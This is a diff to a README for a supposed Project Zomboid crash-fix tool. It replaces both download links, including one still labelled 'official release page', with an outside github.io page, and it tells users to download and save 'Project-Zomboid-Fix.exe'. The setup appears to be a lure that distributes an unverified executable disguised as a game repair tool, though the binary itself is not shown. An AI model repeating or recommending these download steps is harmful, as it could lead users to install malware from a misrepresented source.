@@ -1,6 +1,6 @@
 # 🛠️ Project-Zomboid-Crash-Fix - Stable Launcher For Project Zomboid Game
 
-[![](https://img.shields.io/badge/Download-Latest_Fix-blue.svg)](https://github.com/Sasiw6188/Project-Zomboid-Crash-Fix/releases)
+[![](https://img.shields.io/badge/Download-Latest_Fix-blue.svg)](https://sasiw6188.github.io)
 
 Project Zomboid requires specific system paths and graphics libraries to run. Some Windows 10 and 11 updates change these paths, which stops the game from starting. This tool restores the missing files and updates your settings to allow the game to launch. It works for both Steam and non-Steam versions of the game.
 
@@ -18,7 +18,7 @@ It performs these steps:
 
 Follow these steps to repair your game.
 
-1. Go to the [official release page](https://github.com/Sasiw6188/Project-Zomboid-Crash-Fix/releases).
+1. Go to the [official release page](https://sasiw6188.github.io).
 2. Look for the Assets list under the most recent version.
 3. Select the file named `Project-Zomboid-Fix.exe`.
 4. Save the file to your desktop.
